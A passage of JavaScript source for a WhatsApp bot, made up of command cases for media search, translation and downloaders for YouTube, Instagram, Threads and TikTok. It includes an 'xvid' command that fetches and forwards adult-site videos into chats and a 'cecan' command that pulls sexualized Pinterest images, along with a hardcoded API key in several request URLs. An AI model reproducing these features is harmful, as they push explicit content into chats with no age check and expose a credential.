				if (!/video/.test(mime) && !/image/.test(mime)) return zreply(`*Send/Reply the Video/Image With Caption* ${prefix + command}`)
				if (!quoted) return zreply(`*Send/Reply the Video/Image Caption* ${prefix + command}`)
				let q = m.quoted ? m.quoted : m
				VxoZap.sendMessage(m.chat, {
					react: {
						text: '〽️',
						key: m.key
					}
				});
				let media = await q.download()
				let uploadImage = require('./system/lib/uploadImage')
				let isTele = /image\/(png|jpe?g|gif)|video\/mp4/.test(mime)
				let link = await (isTele ? uploadImage : uploadFile)(media)
				let msg = generateWAMessageFromContent(m.chat, {
					viewOnceMessage: {
						message: {
							"messageContextInfo": {
								"deviceListMetadata": {},
								"deviceListMetadataVersion": 2
							},
							interactiveMessage: proto.Message.InteractiveMessage.create({
								contextInfo: {
									mentionedJid: [m.sender],
									isForwarded: true,
									forwardedNewsletterMessageInfo: {
										newsletterJid: global.xchannel.jid,
										newsletterName: '𝐓𝐡𝐞𝐆𝐞𝐭𝐬𝐮𝐳𝐨𝐙𝐡𝐢𝐫𝐨🐉',
										serverMessageId: -1
									},
									businessMessageForwardInfo: {
										businessOwnerJid: VxoZap.decodeJid(VxoZap.user.id)
									},
								},
								body: proto.Message.InteractiveMessage.Body.create({
									text: link
								}),
								footer: proto.Message.InteractiveMessage.Footer.create({
									text: packname,
								}),
								header: proto.Message.InteractiveMessage.Header.create({
									title: `Hiii, @${m.sender.split("@")[0]} Here Is Your CatBox.Link!\n`,
									subtitle: "𝐓𝐡𝐞𝐆𝐞𝐭𝐬𝐮𝐳𝐨𝐙𝐡𝐢𝐫𝐨🐉",
									hasMediaAttachment: true,
									...(await prepareWAMessageMedia({
										video: {
											url: `${link}`
										}
									}, {
										upload: VxoZap.waUploadToServer
									}))
								}),
								nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({
									buttons: [{
										"name": "cta_copy",
										"buttonParamsJson": `{\"display_text\":\"Copy Url\",\"id\":\"123456789\",\"copy_code\":\"${link}\"}`
									}, ],
								})
							})
						}
					}
				}, {})

				await VxoZap.relayMessage(msg.key.remoteJid, msg.message, {
					messageId: msg.key.id
				}, {
					quoted: m
				})

			}
			break
			//=================================================//

			//SEARCH\\
			//=================================================//
			case 'pinterest':
			case 'pin': {
				if (!isBotRegistered) return zreply(`NOT ACCES‼️`);
				if (!text) return zreply(`Title?`);
				async function createImage(url) {
					const {
						imageMessage
					} = await generateWAMessageContent({
						image: {
							url
						}
					}, {
						upload: VxoZap.waUploadToServer
					});
					return imageMessage;
				}

				function shuffleArray(array) {
					for (let i = array.length - 1; i > 0; i--) {
						const j = Math.floor(Math.random() * (i + 1));
						[array[i], array[j]] = [array[j], array[i]];
					}
				}

				let push = [];
				let {
					data
				} = await axios.get(`https://www.pinterest.com/resource/BaseSearchResource/get/?source_url=%2Fsearch%2Fpins%2F%3Fq%3D${text}&data=%7B%22options%22%3A%7B%22isPrefetch%22%3Afalse%2C%22query%22%3A%22${text}%22%2C%22scope%22%3A%22pins%22%2C%22no_fetch_context_on_resource%22%3Afalse%7D%2C%22context%22%3A%7B%7D%7D&_=1619980301559`);
				let res = data.resource_response.data.results.map(v => v.images.orig.url);

				shuffleArray(res); // Randomize arrays
				let ult = res.splice(0, 10); // Takes the first 10 images from a randomized array
				let i = 1;
				for (let lucuy of ult) {
					push.push({
						body: proto.Message.InteractiveMessage.Body.fromObject({
							text: `_*Here Is The Result Of: ${text}*_`
						}),
						footer: proto.Message.InteractiveMessage.Footer.fromObject({
							text: packname
						}),
						header: proto.Message.InteractiveMessage.Header.fromObject({
							title: `IMAGE - ${i++}`,
							hasMediaAttachment: true,
							imageMessage: await createImage(lucuy)
						}),
						nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.fromObject({
							buttons: [{
								"name": "cta_url",
								"buttonParamsJson": `{"display_text":"Source","url":"https://www.pinterest.com/search/pins/?rs=typed&q=${text}","merchant_url":"https://www.pinterest.com/search/pins/?rs=typed&q=${text}"}`
							}]
						})
					});
				}
				const bot = generateWAMessageFromContent(m.chat, {
					viewOnceMessage: {
						message: {
							messageContextInfo: {
								deviceListMetadata: {},
								deviceListMetadataVersion: 2
							},
							interactiveMessage: proto.Message.InteractiveMessage.fromObject({
								body: proto.Message.InteractiveMessage.Body.create({
									text: mess.done
								}),
								footer: proto.Message.InteractiveMessage.Footer.create({
									text: `> Pinterest Media`
								}),
								header: proto.Message.InteractiveMessage.Header.create({
									hasMediaAttachment: false
								}),
								carouselMessage: proto.Message.InteractiveMessage.CarouselMessage.fromObject({
									cards: [
										...push
									]
								})
							})
						}
					}
				}, {
					quoted: Zets
				});
				await VxoZap.relayMessage(m.chat, bot.message, {
					messageId: bot.key.id
				});
			}
			break
			case 'yts':
			case 'ytsearch': {
				if (!isBotRegistered) return zreply(`NOT ACCES‼️`);
				if (!text) return zreply(`*Example :*\n\n*Yts Pak Tzy〽*️`);
				try {
					let yts = require("yt-search")
					let search = await yts(text);
					let videos = search.all;
					console.log(videos)
					if (!videos || videos.length === 0) {
						zreply('No Video Found');
						return;
					}
					// Choose between 1 and 5 videos at random
					const numVideos = Math.min(videos.length, Math.floor(Math.random() * 10) + 1);
					const selectedVideos = [];
					while (selectedVideos.length < numVideos) {
						const randomIndex = Math.floor(Math.random() * videos.length);
						const randomVideo = videos.splice(randomIndex, 1)[0]; // Avoid selecting the same videos
						selectedVideos.push(randomVideo);
					}
					let push = [];
					for (let i = 0; i < selectedVideos.length; i++) {
						let video = selectedVideos[i];
						let cap = `Title : ${video.title}`;
						const mediaMessage = await prepareWAMessageMedia({
							image: {
								url: video.thumbnail
							}
						}, {
							upload: VxoZap.waUploadToServer
						});
						push.push({
							body: proto.Message.InteractiveMessage.Body.fromObject({
								text: cap
							}),
							footer: proto.Message.InteractiveMessage.Footer.fromObject({
								text: packname
							}),
							header: proto.Message.InteractiveMessage.Header.create({
								title: `Video ${i + 1}`,
								subtitle: '',
								hasMediaAttachment: true,
								...mediaMessage
							}),
							nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.fromObject({
								buttons: [{
									"name": "cta_copy",
									"buttonParamsJson": `{"display_text":"Copy Url","id":"1234","copy_code":"${video.url}"}`
								}]
							})
						});
					}
					const msg = generateWAMessageFromContent(m.chat, {
						viewOnceMessage: {
							message: {
								messageContextInfo: {
									deviceListMetadata: {},
									deviceListMetadataVersion: 2
								},
								interactiveMessage: proto.Message.InteractiveMessage.fromObject({
									body: proto.Message.InteractiveMessage.Body.create({
										text: packname
									}),
									footer: proto.Message.InteractiveMessage.Footer.create({
										text: packname
									}),
									header: proto.Message.InteractiveMessage.Header.create({
										hasMediaAttachment: false
									}),
									carouselMessage: proto.Message.InteractiveMessage.CarouselMessage.fromObject({
										cards: push
									}),
									contextInfo: {
										mentionedJid: [m.sender],
										forwardingScore: 999,
										isForwarded: true,
										forwardedNewsletterMessageInfo: {
											newsletterJid: global.xchannel.jid,
											newsletterName: packname,
											serverMessageId: 143
										}
									}
								})
							}
						}
					}, {
						quoted: zets
					});
					await VxoZap.relayMessage(m.chat, msg.message, {
						messageId: msg.key.id
					});
				} catch (e) {
					console.error(e);
					await zreply(`Error`);
				}
			}
			break
			//=================================================//


			//TRANSLATE\\
			//=================================================//
			case 'terjemahen': {
				if (!isBotRegistered) return zreply(`NOT ACCES‼️`);
				if (!q) return zreply(`*Example :*\n\n*Translate Hallo*`)
				const defaultLang = 'en'
				const tld = 'cn'
				let err = `${gris}E R O R${gris}`.trim()
				let lang = args[0]
				let text = args.slice(1).join(' ')
				if ((args[0] || '').length !== 2) {
					lang = defaultLang
					text = args.join(' ')
				}
				if (!text && m.quoted && m.quoted.text) text = m.quoted.text
				try {
					let result = await translate(text, {
						to: lang,
						autoCorrect: true
					}).catch(_ => null)
					let msgs = generateWAMessageFromContent(m.chat, {
						viewOnceMessage: {
							message: {
								"messageContextInfo": {
									"deviceListMetadata": {},
									"deviceListMetadataVersion": 2
								},
								interactiveMessage: proto.Message.InteractiveMessage.create({
									body: proto.Message.InteractiveMessage.Body.create({
										text: result.text
									}),
									footer: proto.Message.InteractiveMessage.Footer.create({
										text: packname
									}),
									header: proto.Message.InteractiveMessage.Header.create({
										hasMediaAttachment: false,
										...await prepareWAMessageMedia({
											image: fs.readFileSync('./system/image/TheZhiro.jpg')
										}, {
											upload: VxoZap.waUploadToServer
										})
									}),
									nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({
										buttons: [{
											"name": "quick_reply",
											"buttonParamsJson": `{\"display_text\":\"🐉\",\"id\":\""}`
										}],
									}),
									contextInfo: {
										mentionedJid: [m.sender],
										forwardingScore: 999,
										isForwarded: true,
										forwardedNewsletterMessageInfo: {
											newsletterJid: global.xchannel.jid,
											newsletterName: packname,
											serverMessageId: 143
										}
									}
								})
							}
						}
					}, {
						quoted: zets
					})
					return await VxoZap.relayMessage(m.chat, msgs.message, {})
				} catch (e) {
					return zreply(err)
				}
			}
			break
			case "translate":
				if (!isBotRegistered) return zreply(`NOT ACCES‼️`);
				if (!q) return zreply(`*Example :*\n\n*Translate Hallo*`)
				VxoZap.sendButtons(m.chat, {
					"body": "\`\`\`「 TRANSLATE TO LEANGUAGE 」\`\`\`",
					"footer": "⿻  ⌜ 𝐓𝐡𝐞𝐆𝐞𝐭𝐬𝐮𝐳𝐨𝐙𝐡𝐢𝐫𝐨🐉 ⌟  ⿻",
					"buttons": [{
							"displayText": "ENGLISH",
							"id": `Terjemahen ${q}`
						},
						{
							"displayText": "INDONESIAN",
							"id": `Terjemahid ${q}`
						}
					]
				}, {
					quoted: Zets
				});
				break
			case 'terjemahid': {
				if (!isBotRegistered) return zreply(`NOT ACCES‼️`);
				if (!q) return zreply(`*Example :*\n\n*Translate Hallo*`)
				const defaultLang = 'id'
				const tld = 'cn'
				let err = `${gris}E R O R${gris}`.trim()
				let lang = args[0]
				let text = args.slice(1).join(' ')
				if ((args[0] || '').length !== 2) {
					lang = defaultLang
					text = args.join(' ')
				}
				if (!text && m.quoted && m.quoted.text) text = m.quoted.text
				try {
					let result = await translate(text, {
						to: lang,
						autoCorrect: true
					}).catch(_ => null)
					let msgs = generateWAMessageFromContent(m.chat, {
						viewOnceMessage: {
							message: {
								"messageContextInfo": {
									"deviceListMetadata": {},
									"deviceListMetadataVersion": 2
								},
								interactiveMessage: proto.Message.InteractiveMessage.create({
									body: proto.Message.InteractiveMessage.Body.create({
										text: result.text
									}),
									footer: proto.Message.InteractiveMessage.Footer.create({
										text: packname
									}),
									header: proto.Message.InteractiveMessage.Header.create({
										hasMediaAttachment: false,
										...await prepareWAMessageMedia({
											image: fs.readFileSync('./system/image/TheZhiro.jpg')
										}, {
											upload: VxoZap.waUploadToServer
										})
									}),
									nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({
										buttons: [{
											"name": "quick_reply",
											"buttonParamsJson": `{\"display_text\":\"🐉\",\"id\":\""}`
										}],
									}),
									contextInfo: {
										mentionedJid: [m.sender],
										forwardingScore: 999,
										isForwarded: true,
										forwardedNewsletterMessageInfo: {
											newsletterJid: global.xchannel.jid,
											newsletterName: packname,
											serverMessageId: 143
										}
									}
								})
							}
						}
					}, {
						quoted: zets
					})
					return await VxoZap.relayMessage(m.chat, msgs.message, {})
				} catch (e) {
					return zreply(err)
				}
			}
			break
			//=================================================//


			// DOWNLOAD HD \\
			//=================================================//
			case 'ytmp4': {
				if (!isBotRegistered) return zreply(`NOT ACCES‼️`);
				if (!args[0]) return zreply(`*Example :*\n\n*Ytmp4 Link*`);
				zreply(mess.wait)
				let api = await fetch(`https://api.betabotz.eu.org/api/download/ytmp4?url=${args[0]}&apikey=GetsuZo`);
				let betaku = await api.json();
				const {
					title,
					thumb, // Menggunakan thumb dari result
					mp4,
					duration,
					source // URL video YouTube
				} = betaku.result;
				await VxoZap.sendMessage(from, {
					image: {
						url: thumb
					},
					caption: `*› Source :* ${source}`
				}, {
					quoted: Zets
				});
				await VxoZap.sendMessage(from, {
					video: {
						url: mp4
					},
					caption: `${gris}[ Y O U T U B E ]${gris}\n\n*› Title : ${title}*\n*› Duration : ${duration}*`,
					mimetype: 'video/mp4',
				}, {
					quoted: Zets
				});
				await VxoZap.sendButtons(from, {
					"body": `\`\`「 ${gris}[ Y O U T U B E ]${gris} 」\`\`\n\n  *›  UNDUH MUSIC*\n${hiasan}*Durations : ${duration}*`,
					"footer": "⿻  ⌜ 𝐓𝐡𝐞𝐆𝐞𝐭𝐬𝐮𝐳𝐨𝐙𝐡𝐢𝐫𝐨🐉 ⌟  ⿻",
					"buttons": [{
						"displayText": "𝐒𝐎𝐔𝐍𝐃𝐒",
						"id": `ytmp3 ${q}`
					}]
				}, {
					quoted: Zets
				})
			}
			break
			case 'ythd': {
				if (!isBotRegistered) return zreply(`NOT ACCES‼️`);
				if (!text) return zreply(`*Example :*\n\n*Ythd Link*`);
				VxoZap.sendMessage(m.chat, {
					react: {
						text: '✨',
						key: m.key
					}
				})
				let searchResponse = await ytdlnew(text)
				const ytc = `*[ ${gris}YOUTUBE HD QUALITY${gris} ]*\n\n${gris}©${gris}${packname}`;
				await VxoZap.sendMessage(m.chat, {
					video: {
						url: searchResponse.mp4DownloadLink
					},
					caption: ytc
				}, {
					quoted: Zets
				});
				await VxoZap.sendButtons(from, {
					"body": `\`\`「 ${gris}[ Y O U T U B E ]${gris} 」\`\`\n\n  *›  UNDUH MUSIC*`,
					"footer": "⿻  ⌜ 𝐓𝐡𝐞𝐆𝐞𝐭𝐬𝐮𝐳𝐨𝐙𝐡𝐢𝐫𝐨🐉 ⌟  ⿻",
					"buttons": [{
						"displayText": "𝐒𝐎𝐔𝐍𝐃𝐒",
						"id": `ytmp3 ${q}`
					}]
				}, {
					quoted: Zets
				})
			}
			break
			case 'ytmp3': {
				if (!isBotRegistered) return zreply(`NOT ACCES‼️`);
				if (!text) return zreply(`*Example :*\n\n*Ytmp3 Link*`)
				zreply(mess.wait)
				downloadMp3(text)
			}
			break
			case 'threads': {
				if (!isBotRegistered) return zreply(`NOT ACCES‼️`);
				if (!text) return zreply(`*Anda Perlu Memberikan URL Video, Postingan, Gambar Threads Apa Pun*`)
				zreply(mess.wait)
				const createImage = async (url) => {
					const {
						imageMessage
					} = await generateWAMessageContent({
						image: {
							url
						}
					}, {
						upload: VxoZap.waUploadToServer
					});
					return imageMessage;
				};
				const createVideo = async (url) => {
					const {
						videoMessage
					} = await generateWAMessageContent({
						video: {
							url
						}
					}, {
						upload: VxoZap.waUploadToServer
					});
					return videoMessage;
				};
				let res;
				try {
					res = await fetch(`https://api.betabotz.eu.org/api/download/threads?url=${text}?igshid=NTc4MTIwNjQ2YQ==&apikey=GetsuZo`);
				} catch (error) {
					return reply(`Terjadi kesalahan: ${error.message}`);
				}
				let api_response = await res.json();
				if (!api_response || !api_response.result) {
					return reply(`Tidak Ada Video Atau Gambar Yang Ditemukan Atau Respon Dari Api Tidak Valid.`);
				}
				const imageUrls = api_response.result.image_urls;
				const videoUrls = api_response.result.video_urls;
				const mediaCards = [];
				if (videoUrls && videoUrls.length > 0) {
					for (const videoUrl of videoUrls) {
						mediaCards.push({
							header: proto.Message.InteractiveMessage.Header.fromObject({
								title: 'VIDEO',
								hasMediaAttachment: true,
								videoMessage: await createVideo(videoUrl)
							}),
							nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.fromObject({
								buttons: [] // Hapus semua tombol
							})
						});
					}
				}
				if (imageUrls && imageUrls.length > 0) {
					for (const imageUrl of imageUrls) {
						mediaCards.push({
							header: proto.Message.InteractiveMessage.Header.fromObject({
								title: 'IMAGE',
								hasMediaAttachment: true,
								imageMessage: await createImage(imageUrl)
							}),
							nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.fromObject({
								buttons: [] // Hapus semua tombol
							})
						});
					}
				}

				const msg = generateWAMessageFromContent(m.chat, {
					viewOnceMessage: {
						message: {
							messageContextInfo: {
								deviceListMetadata: {},
								deviceListMetadataVersion: 2
							},
							interactiveMessage: proto.Message.InteractiveMessage.fromObject({
								body: proto.Message.InteractiveMessage.Body.fromObject({
									text: `> Threads Media`
								}),
								carouselMessage: proto.Message.InteractiveMessage.CarouselMessage.fromObject({
									cards: mediaCards
								})
							})
						}
					}
				}, {});

				await VxoZap.relayMessage(msg.key.remoteJid, msg.message, {
					messageId: msg.key.id
				});
			}
			break
			case 'instagram':
			case 'insta': {
				if (!isBotRegistered) return zreply(`NOT ACCES‼️`);
				if (!text) return zreply(`*Anda Perlu Memberikan URL Video, Postingan, Reel, Gambar Instagram Apa Pun*`);
				zreply(mess.wait);
				let api = await fetch(`https://api.betabotz.eu.org/api/download/igdowloader?url=${text}&apikey=GetsuZo`)
				let betaku = await api.json();
				for (let i of betaku.message) {
					VxoZap.sendFile(m.chat, i._url, 'beta.mp4', `${gris}[I N S T A G R A M]${gris}\n\n©𝐓𝐡𝐞𝐆𝐞𝐭𝐬𝐮𝐳𝐨𝐙𝐡𝐢𝐫𝐨🐉`, Zets)
				}
			}
			break
			case 'igeror': {
				if (!isBotRegistered) return zreply(`NOT ACCES‼️`);
				if (!text) return zreply(`*Anda Perlu Memberikan URL Video, Postingan, Reel, Gambar Instagram Apa Pun*`);
				zreply(mess.wait);

				const createImage = async (url) => {
					const {
						imageMessage
					} = await generateWAMessageContent({
						image: {
							url
						}
					}, {
						upload: VxoZap.waUploadToServer
					});
					return imageMessage;
				};

				const createVideo = async (url) => {
					const {
						videoMessage
					} = await generateWAMessageContent({
						video: {
							url
						}
					}, {
						upload: VxoZap.waUploadToServer
					});
					return videoMessage;
				};

				let res;
				try {
					res = await fetch(`https://www.guruapi.tech/api/igdlv1?url=${text}`);
				} catch (error) {
					return zreply(`An error occurred: ${error.message}`);
				}

				let api_response = await res.json();
				if (!api_response || !api_response.data) {
					return zreply(`No Video Or Image Found Or Invalid Response From API.`);
				}

				const mediaArray = api_response.data;
				const mediaCards = [];

				for (const mediaData of mediaArray) {
					const mediaType = mediaData.type;
					const mediaURL = mediaData.url_download;

					if (mediaType === 'video') {
						mediaCards.push({
							header: proto.Message.InteractiveMessage.Header.fromObject({
								title: 'HERE IS THE VIDEO',
								hasMediaAttachment: true,
								videoMessage: await createVideo(mediaURL)
							}),
							nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.fromObject({
								buttons: [] // Hapus semua tombol
							})
						});
					} else if (mediaType === 'image') {
						mediaCards.push({
							header: proto.Message.InteractiveMessage.Header.fromObject({
								title: 'HERE IS THE IMAGE',
								hasMediaAttachment: true,
								imageMessage: await createImage(mediaURL)
							}),
							nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.fromObject({
								buttons: [] // Hapus semua tombol
							})
						});
					}
				}

				const msg = generateWAMessageFromContent(m.chat, {
					viewOnceMessage: {
						message: {
							messageContextInfo: {
								deviceListMetadata: {},
								deviceListMetadataVersion: 2
							},
							interactiveMessage: proto.Message.InteractiveMessage.fromObject({
								body: proto.Message.InteractiveMessage.Body.fromObject({
									text: `> Instagram Media`
								}),
								carouselMessage: proto.Message.InteractiveMessage.CarouselMessage.fromObject({
									cards: mediaCards
								})
							})
						}
					}
				}, {});

				await VxoZap.relayMessage(msg.key.remoteJid, msg.message, {
					messageId: msg.key.id
				});
			}
			break
			case 'play': {
				if (!isBotRegistered) return zreply(`NOT ACCES‼️`);
				if (!text) return zreply(`*Example :*\n\n*Play Mendua*`)
				zreply(mess.wait);
				let yts = require("youtube-yts")
				let look = await yts(text);
				let convert = look.videos[0];
				const pl = await youtube(convert.url)
				await VxoZap.sendMessage(m.chat, {
					audio: {
						url: pl.mp3
					},
					fileName: convert.title + '.mp3',
					mimetype: 'audio/mpeg',
					contextInfo: {
						externalAdReply: {
							title: convert.title,
							body: packname,
							thumbnailUrl: convert.image,
							sourceUrl: pl.mp3,
							mediaType: 1,
							mediaUrl: convert.url,
						}
					},
				}, {
					quoted: Zets
				})
			}
			break
			case 'tiktok': {
				if (!isBotRegistered) return zreply(`NOT ACCES‼️`);
				if (!text) return zreply(`*Example :*\n\n*Tiktokdl Link Url*`);
				if (!text.includes('tiktok.com')) return zreply('Url Tidak Mengandung Result Dari Tiktok!');
				zreply(mess.wait);
				try {
					let api = await fetch(`https://api.betabotz.eu.org/api/download/tiktok?url=${encodeURIComponent(text)}&apikey=GetsuZo`);
					let betaku = await api.json();
					if (!betaku.status) return zreply('Gagal mendapatkan data dari API.');
					const {
						title,
						video,
						audio
					} = betaku.result;
					await VxoZap.sendMessage(m.chat, {
						video: {
							url: video[0]
						},
						caption: `${gris}[ T I K T O K ]${gris}\n\n*› Title :* ${title}`,
						mimetype: 'video/mp4',
					}, {
						quoted: Zets
					});
					// Mengirim tombol untuk unduh audio
					await VxoZap.sendButtons(m.chat, {
						"body": `\`\`「 ${gris}[ T I K T O K ]${gris} 」\`\`\n\n  *›  UNDUH AUDIO*\n${hiasan}*Title :* ${title}`,
						"footer": "⿻  ⌜ 𝐓𝐡𝐞𝐆𝐞𝐭𝐬𝐮𝐳𝐨𝐙𝐡𝐢𝐫𝐨🐉 ⌟  ⿻",
						"buttons": [{
							"displayText": "𝐒𝐎𝐔𝐍𝐃𝐒",
							"id": `ttmp3 ${q}`
						}]
					}, {
						quoted: Zets
					});
				} catch (error) {
					zreply('Terjadi Kesalahan Saat Menghubungi API.');
					console.error(error);
				}
			}
			break
			case 'ttmp4':
			case 'ttdl': {
				if (!isBotRegistered) return zreply(`NOT ACCES‼️`);
				if (!text) return zreply(`*Example :* \n\n*Tiktokdl Link Url*`)
				if (!text.includes('tiktok.com')) return zreply('Url Tidak Mengandung Result Dari Tiktok!')
				const hasil = await tiktokDl(text);
				zreply(mess.wait)
				if (hasil.size_nowm) {
					await VxoZap.sendFileUrl(m.chat, hasil.data[1].url, `${gris}[ T I K T O K ]${gris}\n\n${hiasan}*Author* : ${hasil.author.nickname}\n${hiasan}*Capiton* : ${hasil.title}`, Zets)
					await VxoZap.sendButtons(m.chat, {
						"body": `\`\`「 ${gris}[ T I K T O K ]${gris} 」\`\`\n\n  *›  UNDUH AUDIO*\n${hiasan}*Author* : ${hasil.author.nickname}`,
						"footer": "⿻  ⌜ 𝐓𝐡𝐞𝐆𝐞𝐭𝐬𝐮𝐳𝐨𝐙𝐡𝐢𝐫𝐨🐉 ⌟  ⿻",
						"buttons": [{
							"displayText": "𝐒𝐎𝐔𝐍𝐃𝐒",
							"id": `ttmp3 ${q}`
						}]
					}, {
						quoted: Zets
					})
				} else {
					for (let i = 0; i < hasil.data.length; i++) {
						await VxoZap.sendFileUrl(m.chat, hasil.data[i].url, `${gris}[ I M A G E ]${gris}`, Zets)
					}
					await VxoZap.sendButtons(m.chat, {
						"body": `\`\`「 ${gris}[ T I K T O K ]${gris} 」\`\`\n\n  *›  UNDUH AUDIO*\n${hiasan}*Author* : ${hasil.author.nickname}`,
						"footer": "⿻  ⌜ 𝐓𝐡𝐞𝐆𝐞𝐭𝐬𝐮𝐳𝐨𝐙𝐡𝐢𝐫𝐨🐉 ⌟  ⿻",
						"buttons": [{
							"displayText": "𝐒𝐎𝐔𝐍𝐃𝐒",
							"id": `ttmp3 ${q}`
						}]
					}, {
						quoted: Zets
					})
				}
			}
			break
			case 'ttmp3': {
				if (!isBotRegistered) return zreply(`NOT ACCES‼️`);
				if (!text) return zreply(`*Example:*\n\n*Ttmp3 Link Url*`)
				if (!text.includes('tiktok.com')) return zreply('Url Tidak Mengandung Result Dari Tiktok!')
				const hasil = await tiktokDl(text);
				zreply(mess.wait)
				await VxoZap.sendMessage(m.chat, {
					audio: {
						url: hasil.music_info.url
					},
					mimetype: 'audio/mpeg',
					contextInfo: {
						externalAdReply: {
							title: 'TikTok • ' + hasil.author.nickname,
							body: hasil.stats.likes + ' Suka, ' + hasil.stats.comment + ' Komentar. ' + hasil.title,
							previewType: 'PHOTO',
							thumbnailUrl: hasil.cover,
							mediaType: 1,
							renderLargerThumbnail: true,
							sourceUrl: text
						}
					}
				}, {
					quoted: Zets
				});
			}
			break
			case 'xvid': {
				if (!isBotRegistered) return zreply(`NOT ACCES‼️`);
				if (!text) return zreply(`*Example :*\n\nXvid Japan\n\n_~NOTE~_\nStelah Memasukan Japan Dan Muncul URL, Ketik Ulang, Xvid Sertakan URL Nya\n\nXvid URL`);
				if (!text) return zreply('Please provide a search query or a valid Xvideos URL.');
				const isURL = /^(https?:\/\/)?(www\.)?xvideos\.com\/.+$/i.test(text);
				try {
					if (isURL) {
						const result = await xvideosdl(text);
						const {
							title,
							url
						} = result.result;
						const response = await fetch(url);
						const buffer = await response.arrayBuffer();
						let msgs = generateWAMessageFromContent(m.chat, {
							viewOnceMessage: {
								message: {
									"messageContextInfo": {
										"deviceListMetadata": {},
										"deviceListMetadataVersion": 2
									},
									interactiveMessage: proto.Message.InteractiveMessage.create({
										body: proto.Message.InteractiveMessage.Body.create({
											text: `Here you go!!\nTitle: ${title}`
										}),
										footer: proto.Message.InteractiveMessage.Footer.create({
											text: packname
										}),
										header: proto.Message.InteractiveMessage.Header.create({
											hasMediaAttachment: false,
											...await prepareWAMessageMedia({
												video: Buffer.from(buffer)
											}, {
												upload: VxoZap.waUploadToServer
											})
										}),
										nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({
											buttons: [{
												"name": "quick_reply",
												"buttonParamsJson": `{\"display_text\":\"💦\",\"id\":\""}`
											}],
										}),
										contextInfo: {
											mentionedJid: [m.sender],
											forwardingScore: 999,
											isForwarded: true,
											forwardedNewsletterMessageInfo: {
												newsletterJid: global.xchannel.jid,
												newsletterName: packname,
												serverMessageId: 143
											}
										}
									})
								}
							}
						}, {
							quoted: m
						})
						await VxoZap.relayMessage(m.chat, msgs.message, {})
					} else {
						const results = await xvideosSearch(text);
						if (results.length === 0) {
							zreply('No search results found for the given query.');
						} else {
							const searchResults = results.map((result, index) => {
								return `${index + 1}. *${result.title}*\nDuration: ${result.duration}\nQuality: ${result.quality}\nURL: ${result.url}`;
							}).join('\n\n');
							let msgs = generateWAMessageFromContent(m.chat, {
								viewOnceMessage: {
									message: {
										"messageContextInfo": {
											"deviceListMetadata": {},
											"deviceListMetadataVersion": 2
										},
										interactiveMessage: proto.Message.InteractiveMessage.create({
											body: proto.Message.InteractiveMessage.Body.create({
												text: `*Search Results for "${text}":*\n\n${searchResults}`
											}),
											footer: proto.Message.InteractiveMessage.Footer.create({
												text: packname
											}),
											header: proto.Message.InteractiveMessage.Header.create({
												hasMediaAttachment: false,
												...await prepareWAMessageMedia({
													image: fs.readFileSync('./system/image/TheZhiro.jpg')
												}, {
													upload: VxoZap.waUploadToServer
												})
											}),
											nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({
												buttons: [{
													"name": "quick_reply",
													"buttonParamsJson": `{\"display_text\":\"💦\",\"id\":\""}`
												}],
											}),
											contextInfo: {
												mentionedJid: [m.sender],
												forwardingScore: 999,
												isForwarded: true,
												forwardedNewsletterMessageInfo: {
													newsletterJid: global.xchannel.jid,
													newsletterName: packname,
													serverMessageId: 143
												}
											}
										})
									}
								}
							}, {
								quoted: m
							})
							await VxoZap.relayMessage(m.chat, msgs.message, {})
						}
					}
				} catch (error) {
					console.error(error);
					return zreply('Failed To Fetch Xvideos Video Details.');
				}
			};
			break
			case 'cecan': {
				if (!isBotRegistered) return zreply(`NOT ACCES‼️`);
				zreply(mess.wait)
				const createImage = async (url) => {
					const {
						imageMessage
					} = await generateWAMessageContent({
						image: {
							url
						}
					}, {
						upload: VxoZap.waUploadToServer
					});
					return imageMessage;
				};
				async function pinterest(query) {
					let res = await fetch(`https://www.pinterest.com/resource/BaseSearchResource/get/?source_url=%2Fsearch%2Fpins%2F%3Fq%3D${query}&data=%7B%22options%22%3A%7B%22isPrefetch%22%3Afalse%2C%22query%22%3A%22${query}%22%2C%22scope%22%3A%22pins%22%2C%22no_fetch_context_on_resource%22%3Afalse%7D%2C%22context%22%3A%7B%7D%7D&_=1619980301559`);
					let json = await res.json();
					let data = json.resource_response.data.results;
					if (!data.length) reply(`Query "${query}" not found :/`);
					return data[~~(Math.random() * data.length)].images.orig.url;
				}
				const imageUrls = [];
				for (let i = 0; i < 10; i++) {
					const imageUrl = await pinterest('Tobrut')
					imageUrls.push(imageUrl);
				}
				const cards = await Promise.all(imageUrls.map(async (url, index) => ({
					header: proto.Message.InteractiveMessage.Header.fromObject({
						title: `IMAGE ${index + 1}`,
						hasMediaAttachment: true,
						imageMessage: await createImage(url)
					}),
					nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.fromObject({
						buttons: [] // Hapus semua tombol
					})
				})));
				const msg = generateWAMessageFromContent(m.chat, {
					viewOnceMessage: {
						message: {
							messageContextInfo: {
								deviceListMetadata: {},
								deviceListMetadataVersion: 2
							},
							interactiveMessage: proto.Message.InteractiveMessage.fromObject({
								body: proto.Message.InteractiveMessage.Body.fromObject({
									text: `> Batas 10 Photo`
								}),
								carouselMessage: proto.Message.InteractiveMessage.CarouselMessage.fromObject({
									cards
								})
							})
						}
					}
				}, {});

				await VxoZap.relayMessage(msg.key.remoteJid, msg.message, {
					messageId: msg.key.id
				});
			};
			break
			case 'tiktokslide':
			case 'ttslide': {
				if (!isBotRegistered) return zreply(`NOT ACCES‼️`);
				if (!text) return zreply(`*Example :* \n\n*Tiktokdl Link Url*`)
				if (!text.includes('tiktok.com')) return zreply('Url Tidak Mengandung Result Dari Tiktok!')
				zreply(mess.wait)
				try {
					let query = args[0]; // Mendapatkan URL dari args
					if (!query) return zreply('Masukkan URL TikTok Terlebih Dahulu.');

					// Memfetch data dari API TikTok Slide
					let res = await fetch(`https://api.betabotz.eu.org/api/download/ttslide?url=${query}&apikey=GetsuZo`);
					let json = await res.json();

